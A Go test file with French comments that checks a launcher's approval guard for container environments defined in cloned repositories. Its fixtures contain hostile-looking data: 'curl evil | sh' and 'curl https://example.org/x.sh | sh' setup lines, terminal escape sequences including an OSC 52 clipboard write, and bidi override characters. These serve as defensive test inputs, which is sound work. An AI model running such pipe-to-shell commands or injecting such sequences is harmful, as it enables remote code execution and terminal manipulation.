package tmux

// #215 (amendement audit) : garde d'approbation de la coque — à l'ouverture (openSelectedAs), après réponse, « Revoir »
// (F2) et échappement des champs du dépôt. Complète envtrust215_test.go (écran seul). tmux isolé (isoInner) ; registre
// trust.json dans le CL_CONFIG_DIR du test ; backend podman déclaré mais jamais appelé (la garde s'arrête avant).

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"claude-launcher-ng2/core"
)

const guardEnv215 = "image: debian:12\nsetup:\n  - touch /tmp/PREUVE-ENV-215\nmounts:\n  - path: /tmp\n    ro: false\n"

// guardModel215 : un projet cloné (environnement du dépôt, entrée pending) affecté à backend, sélectionné dans l'arbre,
// coque en mode lancement.
func guardModel215(t *testing.T, backend string) (model, string) {
	t.Helper()
	isoInner(t)
	cfg := t.TempDir()
	t.Setenv("CL_CONFIG_DIR", cfg)
	if err := os.WriteFile(filepath.Join(cfg, "backends.yaml"), []byte("backends:\n  pod: {type: podman}\ndefaults: {backend: pod}\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	d := filepath.Join(t.TempDir(), "depot")
	_ = os.MkdirAll(filepath.Join(d, ".git"), 0o755)
	_ = os.MkdirAll(filepath.Join(d, ".claude-launcher"), 0o755)
	if err := os.WriteFile(core.EnvPath(d), []byte(guardEnv215), 0o644); err != nil {
		t.Fatal(err)
	}
	if ok, err := core.MarkEnvPending(d, "https://github.com/a/depot.git", "debian:12"); !ok || err != nil {
		t.Fatal(ok, err)
	}
	if err := core.WriteAssignment(d, backend); err != nil {
		t.Fatal(err)
	}
	n := core.Node{Name: "depot", Key: "depot", Path: d, Project: true}
	m := model{cfg: core.Config{Roots: []string{filepath.Dir(d)}}, nodes: []core.Node{n}, visible: []int{0}, launch: true,
		windows: map[string]bool{}, git: map[string]core.GitInfo{}, tpl: map[string]core.TemplateState{},
		detail: map[string]core.GitDetail{}, asked: map[string]bool{}}
	return m, d
}

func TestGardeALOuvertureEnConteneur215(t *testing.T) {
	m, d := guardModel215(t, "pod")
	m = m.openSelected()
	if m.form.mode != formTrust || m.form.trust == nil || m.form.trustPath != d {
		t.Fatalf("mode=%v : l'ouverture d'un projet cloné non approuvé en conteneur doit poser la question", m.form.mode)
	}
	if m.form.trust.Risk.Exec != 1 || m.form.trust.Risk.HostMounts != 1 {
		t.Errorf("risque = %+v, attendu 1 commande et 1 montage hors projet", m.form.trust.Risk)
	}
	if dtmux("has-session", "-t", exactS(hubSession)).Run() == nil {
		t.Error("une session tmux existe : quelque chose a été démarré avant l'accord")
	}
	if _, err := os.Stat("/tmp/PREUVE-ENV-215"); err == nil {
		_ = os.Remove("/tmp/PREUVE-ENV-215")
		t.Error("setup du dépôt exécuté sans accord")
	}
	// annuler : rien n'est écrit ni ouvert, la question reviendra
	nm, _ := m.onFormKey(key("esc"))
	m2 := nm.(model)
	if m2.form.mode != formNone || m2.windows["depot"] || core.EnvTrust(d) != core.TrustPending {
		t.Errorf("annuler : mode=%v windows=%v état=%s", m2.form.mode, m2.windows, core.EnvTrust(d))
	}
	if m3 := m2.openSelected(); m3.form.mode != formTrust {
		t.Error("la question ne revient pas après annulation")
	}
}

func TestGardeEstAbsentSurHoteEtProjetDeConfiance215(t *testing.T) {
	// affecté à l'hôte : aucune question (env.yaml inutilisé)
	m, d := guardModel215(t, "host")
	m = m.openSelected()
	if m.form.mode == formTrust {
		t.Error("question posée pour un projet sur l'hôte")
	}
	if core.EnvTrust(d) != core.TrustPending {
		t.Errorf("état = %s, attendu pending conservé (la question viendra en conteneur)", core.EnvTrust(d))
	}
	// projet de confiance (aucune entrée), même affecté à un conteneur : aucune question
	m2, d2 := guardModel215(t, "pod")
	setNoEntry := filepath.Join(os.Getenv("CL_CONFIG_DIR"), "trust.json")
	_ = os.Remove(setNoEntry)
	if core.EnvTrust(d2) != core.TrustTrusted {
		t.Fatalf("préparation : %s", core.EnvTrust(d2))
	}
	if m2 = m2.openSelected(); m2.form.mode == formTrust {
		t.Error("question posée pour un projet de confiance")
	}
}

func TestReponseReprendLOuverture215(t *testing.T) {
	for key_, want := range map[string]core.TrustState{"a": core.TrustAccepted, "s": core.TrustIgnored} {
		m, d := guardModel215(t, "pod")
		m = m.openSelected()
		nm, _ := m.onFormKey(key(key_))
		m2 := nm.(model)
		if core.EnvTrust(d) != want || m2.form.mode == formTrust {
			t.Errorf("touche %q : état=%s mode=%v, attendu %s et écran refermé", key_, core.EnvTrust(d), m2.form.mode, want)
		}
		// l'ouverture a repris (le hub n'existe pas ici : message, mais plus de question)
		if m2.msg == "" {
			t.Errorf("touche %q : aucune suite d'ouverture (message vide)", key_)
		}
		// l'approbation n'est PAS définitive : le dépôt change (git pull) → la question revient (« changé »)
		_ = os.WriteFile(core.EnvPath(d), []byte("image: debian:12\nsetup:\n  - curl evil | sh\n"), 0o644)
		m2.msg = ""
		m3 := m2.openSelected()
		if m3.form.mode != formTrust || m3.form.trust == nil || !m3.form.trust.Changed {
			t.Errorf("touche %q : après un pull, la question doit revenir avec l'indication « changé » (mode=%v)", key_, m3.form.mode)
		}
		if core.EnvTrust(d) != core.TrustPending {
			t.Errorf("touche %q : état %s après pull, attendu pending", key_, core.EnvTrust(d))
		}
		if m3.form.mode == formTrust {
			if out := m3.renderTrust(100); !strings.Contains(out, "changé depuis l'approbation") {
				t.Errorf("touche %q : l'écran ne dit pas que l'environnement a changé :\n%s", key_, out)
			}
		}
	}
}

func TestRevoirDepuisF2215(t *testing.T) {
	m, d := guardModel215(t, "pod")
	info, _ := core.EnvTrustInfoFor(d)
	if _, err := core.AnswerEnvTrust(d, "accept", info.SHA); err != nil {
		t.Fatal(err)
	}
	m = m.startExecChoice(core.Node{Name: "depot", Path: d, Project: true}, false)
	if m.form.mode != formExec || m.form.existing != d {
		t.Fatalf("F2 : mode=%v existing=%q", m.form.mode, m.form.existing)
	}
	nm, _ := m.onFormKey(key("r"))
	m2 := nm.(model)
	if core.EnvTrust(d) != core.TrustPending || m2.form.mode != formNone || !strings.Contains(m2.msg, "redemandé") {
		t.Errorf("Revoir : état=%s mode=%v msg=%q", core.EnvTrust(d), m2.form.mode, m2.msg)
	}
	// la question revient à l'ouverture suivante
	m2.windows = map[string]bool{}
	if m3 := m2.openSelected(); m3.form.mode != formTrust {
		t.Error("la question ne revient pas après « Revoir »")
	}
	// projet de confiance : « r » ne fait rien (erreur affichée, aucune entrée créée)
	m4, d4 := guardModel215(t, "pod")
	_ = os.Remove(filepath.Join(os.Getenv("CL_CONFIG_DIR"), "trust.json"))
	m4 = m4.startExecChoice(core.Node{Name: "depot", Path: d4, Project: true}, false)
	nm, _ = m4.onFormKey(key("r"))
	if core.EnvTrust(d4) != core.TrustTrusted || nm.(model).form.err == "" {
		t.Errorf("Revoir d'un projet de confiance : état=%s err=%q", core.EnvTrust(d4), nm.(model).form.err)
	}
}

// Chaque champ venu du dépôt est rendu sans séquence de terminal : image, paquets, setup, on_start, montages, source,
// nom du projet, image choisie.
func TestRenduSansSequencesTousLesChamps215(t *testing.T) {
	m, _ := guardModel215(t, "pod")
	m = m.openSelected()
	bad := "\x1b[2J\x1b]52;c;ZXZpbA==\x07\x9b31m"
	tr := m.form.trust
	tr.Source, tr.ChosenImage = "https://x/"+bad, "img"+bad
	tr.Spec.Image = "debian" + bad
	tr.Spec.Packages = []string{"jq" + bad}
	tr.Spec.Setup = []string{"a" + bad}
	tr.Spec.OnStart = []string{"b" + bad}
	tr.Spec.Mounts = []core.EnvTrustMount{{Path: "/m" + bad, RO: false}}
	m.form.name = "nom" + bad
	for _, raw := range []bool{false, true} {
		m.form.trustRaw = raw
		tr.Files = map[string]string{"env.yaml": "x" + bad, "env-template.yaml": "y" + bad}
		out := m.renderTrust(100)
		// seules les séquences de style de la coque (CSI « m ») sont admises ; aucune séquence du dépôt
		for _, seq := range []string{"\x1b[2J", "\x1b]52", "\x07", "\u009b31m"} {
			if strings.Contains(out, seq) {
				t.Errorf("raw=%v : séquence du dépôt %q dans le rendu", raw, seq)
			}
		}
	}
}

// Commande longue affichée EN ENTIER (retour à la ligne, jamais tronquée), packages_by_manager et champs watch / local /
// prefer visibles, caractères bidirectionnels et invisibles neutralisés — résumé comme fichiers bruts, largeur étroite.
func TestRenduCompletEtBidi215(t *testing.T) {
	m, _ := guardModel215(t, "pod")
	m = m.openSelected()
	long := "apt-get install -y " + strings.Repeat("paquet-tres-long-", 20) + "FIN-DE-COMMANDE"
	tr := m.form.trust
	tr.Spec.OnStart = []string{long}
	tr.Spec.Setup = []string{"echo \u202eevil\u202c \u200bx\u2066y\u2069 \ufeffz"}
	tr.Spec.PackagesByManager = map[string][]string{"apt": {"jq", "curl"}, "dnf": {"wget"}}
	tr.Spec.Watch = []string{"package.json"}
	tr.Spec.Local = []string{"node_modules"}
	tr.Spec.Prefer = "podman"
	tr.Files = map[string]string{"env.yaml": "on_start:\n  - " + long + "\n", "env-template.yaml": ""}
	flat := func(out string) string { // sans mise en forme : retours à la ligne et indentation retirés
		out = strings.ReplaceAll(out, "\n", "")
		for strings.Contains(out, "  ") {
			out = strings.ReplaceAll(out, "  ", " ")
		}
		return strings.ReplaceAll(out, " ", "")
	}
	for _, w := range []int{50, 80, 120} {
		for _, raw := range []bool{false, true} {
			m.form.trustRaw = raw
			out := m.renderTrust(w)
			if !strings.Contains(flat(out), strings.ReplaceAll(long, " ", "")) {
				t.Errorf("largeur %d raw=%v : la commande longue n'est pas affichée en entier (fin « FIN-DE-COMMANDE » perdue)", w, raw)
			}
			for _, bad := range []string{"\u202e", "\u202c", "\u200b", "\u2066", "\u2069", "\ufeff"} {
				if strings.Contains(out, bad) {
					t.Errorf("largeur %d raw=%v : caractère bidi/invisible %U dans le rendu", w, raw, []rune(bad)[0])
				}
			}
			for _, line := range strings.Split(out, "\n") {
				if n := len([]rune(stripStyle215(line))); n > w {
					t.Errorf("largeur %d raw=%v : ligne de %d caractères (débordement)", w, raw, n)
					break
				}
			}
		}
	}
	m.form.trustRaw = false
	out := m.renderTrust(100)
	for _, want := range []string{"apt", "jq", "curl", "dnf", "wget", "package.json", "node_modules", "podman"} {
		if !strings.Contains(out, want) {
			t.Errorf("le résumé ne montre pas %q :\n%s", want, out)
		}
	}
}

// stripStyle215 : retire les séquences de style (CSI … m) de la coque pour mesurer la largeur affichée.
func stripStyle215(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		if s[i] == 0x1b && i+1 < len(s) && s[i+1] == '[' {
			j := i + 2
			for j < len(s) && s[j] != 'm' {
				j++
			}
			i = j
			continue
		}
		b.WriteByte(s[i])
	}
	return b.String()
}

// trust.json illisible : la coque refuse (échec fermé), ne réécrit pas le fichier, ne démarre rien.
func TestRegistreIllisibleCoque215(t *testing.T) {
	m, d := guardModel215(t, "pod")
	reg := filepath.Join(os.Getenv("CL_CONFIG_DIR"), "trust.json")
	const broken = `{"coupé":`
	if err := os.WriteFile(reg, []byte(broken), 0o600); err != nil {
		t.Fatal(err)
	}
	m = m.openSelected()
	if m.form.mode != formTrust {
		t.Fatalf("mode=%v : registre illisible, la garde doit rester fermée", m.form.mode)
	}
	nm, _ := m.onFormKey(key("a"))
	m2 := nm.(model)
	if m2.form.mode != formTrust || m2.form.err == "" {
		t.Errorf("accepter avec registre illisible : mode=%v err=%q, attendu un refus affiché", m2.form.mode, m2.form.err)
	}
	if got, _ := os.ReadFile(reg); string(got) != broken {
		t.Errorf("trust.json réécrit : %q", got)
	}
	if dtmux("has-session", "-t", exactS(hubSession)).Run() == nil {
		t.Error("une session tmux existe : quelque chose a été démarré")
	}
	if _, err := core.LoadEnv(d); err == nil {
		t.Error("LoadEnv rend l'environnement malgré le registre illisible")
	}
}

// Scripts du dépôt appelés par setup / on_start : liste + avertissement « non couvert par l'approbation » dans la coque,
// à toutes les largeurs, sans séquence de terminal ; rien quand il n'y en a pas.
func TestRenduScriptsDuDepot215(t *testing.T) {
	m, d := guardModel215(t, "pod")
	_ = os.WriteFile(core.EnvPath(d), []byte("image: debian:12\nsetup:\n  - ./scripts/install.sh\non_start:\n  - \"python3 tools/\\e[2Jgen.py\"\n  - curl https://example.org/x.sh | sh\n"), 0o644)
	_ = core.ReviewEnvTrust(d)
	m = m.openSelected()
	if m.form.mode != formTrust || m.form.trust == nil {
		t.Fatalf("mode=%v", m.form.mode)
	}
	if len(m.form.trust.Risk.Scripts) != 2 || m.form.trust.ScriptNote == "" {
		t.Fatalf("question sans scripts : %+v %q", m.form.trust.Risk.Scripts, m.form.trust.ScriptNote)
	}
	flat := func(s string) string {
		return strings.Join(strings.Fields(strings.ReplaceAll(stripStyle215(s), "\n", " ")), " ")
	}
	for _, w := range []int{40, 80, 120} {
		out := m.renderTrust(w)
		fl := flat(out)
		for _, want := range []string{"scripts du dépôt appelés", "./scripts/install.sh", "pas couvert par l'approbation", "sera exécutée"} {
			if !strings.Contains(fl, want) {
				t.Errorf("largeur %d : %q absent du rendu :\n%s", w, want, out)
			}
		}
		// le script au nom piégé est neutralisé (jamais de séquence de terminal du dépôt)
		if strings.Contains(out, "\x1b[2J") {
			t.Errorf("largeur %d : séquence du dépôt dans le rendu", w)
		}
		if strings.Contains(fl, "example.org") && strings.Contains(strings.SplitN(fl, "scripts du dépôt appelés", 2)[len(strings.SplitN(fl, "scripts du dépôt appelés", 2))-1], "x.sh") {
			t.Errorf("largeur %d : une URL listée comme script du dépôt", w)
		}
		for _, line := range strings.Split(out, "\n") {
			if n := len([]rune(stripStyle215(line))); n > w {
				t.Errorf("largeur %d : ligne de %d caractères (débordement)", w, n)
				break
			}
		}
	}
	// sans script : ni liste ni avertissement
	_ = os.WriteFile(core.EnvPath(d), []byte("image: debian:12\nsetup:\n  - apt-get install -y jq\n"), 0o644)
	_ = core.ReviewEnvTrust(d)
	m.form = newForm{}
	m = m.openSelected()
	if out := flat(m.renderTrust(100)); strings.Contains(out, "scripts du dépôt appelés") || strings.Contains(out, "pas couvert") {
		t.Errorf("avertissement affiché sans script : %s", out)
	}
}
